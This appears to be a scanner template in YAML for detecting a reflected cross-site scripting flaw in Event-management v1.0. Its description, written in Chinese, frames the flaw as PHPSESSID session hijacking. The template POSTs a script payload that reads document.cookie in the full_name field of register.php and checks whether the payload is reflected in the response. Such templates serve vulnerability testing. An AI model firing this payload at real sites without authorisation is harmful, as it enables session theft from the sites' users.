id: Event-managementv1.0-remote-XSS-Reflected-PHPSESSID-hijacking

info:
  name: Event-management v1.0 remote XSS-Reflected PHPSESSID hijacking
  author: nu11secur1ty
  severity: critical
  description: 系统事件管理(Event-management v1.0) 容易受到 XSS-Reflected PHPSESSID 劫持。register.php 中的参数 full_name 没有正确清理，攻击者可以使用PHPSESSID它来操纵已经创建的系统登录会话。
  reference:
    - https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/PuneethReddyHC/event-management-1.0

set:
  hosturl: request.url
rules:
  r0:
    request:
      method: POST
      path: /backend/register.php
      headers:
        Origin: "{{hosturl}}"
        Referer: "{{hosturl}}/register.php?event_id=1"
        X-Requested-With: XMLHttpRequest
      body: |
        full_name=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&event_id=1&email=admin%40gmail.com&mobile=213213213&college=pwned&branch=pwned
    expression: response.status == 200 && response.body.bcontains(b'<script>alert(document.cookie)</script>') && response.headers["content-type"].contains("text/html")
expression: r0()